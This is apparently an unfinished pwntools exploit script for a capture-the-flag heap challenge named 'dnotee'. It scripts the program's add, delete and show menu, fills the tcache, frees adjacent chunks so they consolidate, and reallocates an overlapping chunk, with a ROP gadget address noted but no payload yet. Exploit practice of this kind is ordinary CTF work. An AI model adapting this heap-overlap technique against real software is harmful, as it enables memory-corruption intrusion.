#!/usr/bin/env python3
from pwn import *

exe = ELF("dnotee")
libc = ELF("libc.so")
ld = ELF("ld-2.32.so")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("addr", 1337)
else:
    p = process([exe.path])
    gdb.attach(p, """"

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def add(idx,size,name):
    sla(b">>",b"1")
    sla(b":",str(idx).encode())
    sla(b":",str(size).encode())
    sla(b":",name)
def delete(idx):
    sla(b">>",b"3")
    sla(b":",str(idx).encode())
def show(idx):
    sla(b">>",b"2")
    sla(b":",str(idx).encode())
pop_rdi = 0x000000000040156b
log.info(f"allocate 7 chunks and then 2 more")
for i in range(9):
    print(i)
    add(i,0x100,b"lmaodark")
add(9,0x10,b"no consolidation")
for i in range(7):
    delete(i)
delete(8)
delete(7)
input()
add(0,0x230,b"name")



p.interactive()
# good luck pwning :)

